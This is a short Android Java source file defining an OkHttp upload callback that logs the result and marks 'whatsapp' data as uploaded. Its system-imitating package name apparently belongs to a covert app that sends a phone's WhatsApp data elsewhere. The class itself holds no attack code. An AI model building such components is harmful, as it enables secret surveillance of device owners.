package system.android.services.imei;

import android.content.Context;
import android.util.Log;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;

/**
 * Created by dave on 2/7/16.
 */
public class UploadSuccessCallback implements Callback {
	Context mContext;
	public UploadSuccessCallback(Context context){
		mContext=context;
	}

	@Override
	public void onFailure(Call call, IOException e) {
		Log.d("maninder","upload failed");
	}

	@Override
	public void onResponse(Call call, Response response) throws IOException {
		FIleHandler.saveData(mContext,"whatsapp",null,false);
		Log.d("maninder","upload successfull");
	}
}
